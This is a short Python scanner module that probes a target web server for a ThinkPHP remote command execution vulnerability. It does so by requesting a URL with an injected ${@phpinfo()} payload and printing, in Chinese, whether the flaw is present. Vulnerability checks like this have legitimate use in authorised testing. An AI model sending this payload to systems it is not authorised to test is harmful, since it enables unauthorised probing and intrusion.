# -*- encoding: utf-8 -*-
'''
@File : thinkphprce.py
@Time : 2019/07/06 19:30:01
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *

def thinkphp(target):
    try:
        print('\n')
        print(Vcolors.OKBLUE + "正在对目标url进行ThinkPHP命令执行漏洞探测~~" + Vcolors.ENDC)
        url = target + "/index.php/module/aciton/param1/${@phpinfo()}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
            print(Vcolors.RED +"存在ThinkPHP命令执行漏洞" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在ThinkPHP命令执行漏洞" + Vcolors.ENDC)
    except:
        print(Vcolors.YELLOW+"疑似存在防火墙，链接已被拦截"+ Vcolors.ENDC)